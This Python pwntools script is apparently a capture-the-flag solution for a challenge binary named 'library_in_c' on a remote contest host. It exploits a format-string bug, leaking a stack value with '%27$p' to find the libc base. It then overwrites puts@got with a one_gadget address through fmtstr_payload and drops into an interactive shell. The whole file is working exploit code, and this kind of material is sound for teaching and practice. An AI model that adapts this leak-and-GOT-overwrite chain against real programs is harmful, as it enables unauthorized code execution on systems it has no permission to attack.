from pwn import *
import sys

context.clear(arch='amd64', os='linux')

argv = sys.argv
binary_path = './library_in_c'
REMOTE = False
DEBUG = False

if len(argv) > 1:
	if argv[1] == 'remote':
		REMOTE = True
	if argv[1] == 'debug':
		DEBUG = True

sh = remote('shell.actf.co', 20201)
libc = ELF('./libc.so.6', checksec=False)

e = ELF(binary_path)

# ------------- plan -----------
# leak main return address using format string
# overwrite puts@got with one_gadget


sh.sendlineafter('What is your name?\n', '%27$p')
sh.recvuntil('Why hello there ')
leak = int(sh.recvline()[2:-1], 16) - 240
libc.address = leak - libc.sym['__libc_start_main']

log.info('leak: {}'.format(hex(leak)))
log.info('libc base: {}'.format(hex(libc.address)))

one_gadget = libc.address + 0x4526a
puts_got = e.got['puts']
print(puts_got)
print(one_gadget)
payload = fmtstr_payload(16, {puts_got: one_gadget}, write_size='short')
print(payload)

log.info('one gadget: {}'.format(hex(one_gadget)))
log.info('puts@got: {}'.format(hex(puts_got)))
log.info('payload:\n{}'.format(hexdump(payload)))
sh.sendlineafter('And what book would you like to check out?', payload)

sh.interactive()